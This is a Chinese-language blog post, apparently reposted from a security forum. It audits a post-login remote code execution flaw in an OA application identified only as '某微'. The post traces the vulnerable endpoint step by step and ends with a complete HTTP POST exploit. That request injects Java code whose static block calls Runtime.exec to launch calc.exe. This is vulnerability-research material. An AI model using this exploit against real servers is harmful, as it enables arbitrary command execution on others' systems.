---
title: 某微1day后台RCE审计漏洞 - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/17015353.html
source: 博客园 - 渗透测试中心
date: 2022-12-31
fetch_date: 2025-10-04T02:47:58.397258
---

# 某微1day后台RCE审计漏洞 - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [某微1day后台RCE审计漏洞](https://www.cnblogs.com/backlion/p/17015353.html "发布于 2022-12-30 17:02")

某应用存在后台RCE，根据相关信息，我们在对后台审计过程，这里发现一处调用newInstance实例化

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221230170129034-671147105.jpg)

溯源找到InterfaceRegisterCustomOperationCmd #excute

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221230170129956-1020521781.jpg)

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221230170130646-385254389.jpg)

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221230170131290-137097182.jpg)

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221230170131980-1777197742.jpg)

访问路径为 /api/integration/workflowflow/getInterfaceRegisterCustomOperation

getInterfaceRegisterCustomOperation调用了execute，首先判断了用户，所以这里是后台漏洞

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221230170132700-2106793641.jpg)

因为我们需要这个污点函数JavaCodeToObject，所以要满足if的条件并且控制var18和var20

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221230170133379-129851401.jpg)

这里var14要为add

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221230170134013-1295699688.jpg)

var14的值是从请求参数method取得，因为前面是指定POST方法所以这里`method=add`

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221230170134726-485666733.jpg)

进入if判断后var15的值如果为空就会return掉，所以这里`actionid`的值不为空就好，结合上面的条件就是`method=add&actionid=1`

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221230170135481-1496417566.jpg)

这里var18的开头如果不是`weaver.interfaces.workflow.action.javacode.Action`将会进入下面的判断导致抛出异常，达不到我们想要的结果，所以这里`classname=weaver.interfaces.workflow.action.javacode.Action`，结合上面的参数`method=add&actionid=1classname=weaver.interfaces.workflow.action.javacode.Action`

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221230170136238-102379160.jpg)

下面var20值取自javacode参数，结合上面payload为`method=add&actionid=1&classname=weaver.interfaces.workflow.action.javacode.Action&javacode=`

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221230170136847-546769203.jpg)

if如果var18包含`weaver.interfaces.workflow.action.javacode`进入我们想要的javacodetoobject调用，所以`classname=weaver.interfaces.workflow.action.javacode.Action.weaver.interfaces.workflow.action.javacode.Action`两个条件用.连接否则会报加载异常

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221230170137504-33586078.jpg)

根据上面的条件都已满足var18和var20条件，构造var20的参数为 `javacode=package weaver.interfaces.workflow.action.javacode.Action.weaver.interfaces.workflow.action.javacode; import java.io.IOException; public class test { static { try { Runtime.getRuntime().exec("calc.exe"); } catch (IOException e) { e.printStackTrace(); } } }`这里将命令执行的代码放在静态代码块是因为实例化的时候会自动执行static中的代码，达到命令执行

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221230170138280-888687245.jpg)

实际发包好像没有利用成功，回头看一下代码 发现丢了个参数 dtinfo\_CustomParameterData

```
POST /api/integration/workflowflow/getInterfaceRegisterCustomOperation HTTP/1.1
Host:
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.33
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: ecology_JSessionid=aaa8G6PRBnnBD82yi6Fky; JSESSIONID=aaa8G6PRBnnBD82yi6Fky; __randcode__=d2fa15e2-395e-4b3b-a004-82fc07c18695; loginidweaver=1; languageidweaver=7; loginuuids=1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 548

method=add&actionid=1&classname=weaver.interfaces.workflow.action.javacode.Action.weaver.interfaces.workflow.action.javacode.Test&dtinfo_CustomParameterData=11&javaCode=package weaver.interfaces.workflow.action.javacode.Action.weaver.interfaces.workflow.action.javacode;
import java.io.IOException;
public class Test {
    static {
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221230170139043-1135092367.png)

转载来自： <https://xz.aliyun.com/t/11947>

posted @
2022-12-30 17:02
[渗透测试中心](https://www.cnblogs.com/backlion)
阅读(414)
评论(0)

收藏
举报

刷新页面[返回顶部](#top)

[![](https://img2024.cnblogs.com/blog/35695/202508/35695-20250830121216742-1062949948.jpg)](https://developer.huawei.com/consumer/cn/activity/digixActivity/digixcmsdetail/101750143863263087?ha_source=BKYQ3&ha_sourceId=89000408)

### 公告

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250923174722171-270282128.jpg)](https://qoder.com/)

[博客园](https://www.cnblogs.com/)
  ©  2004-2025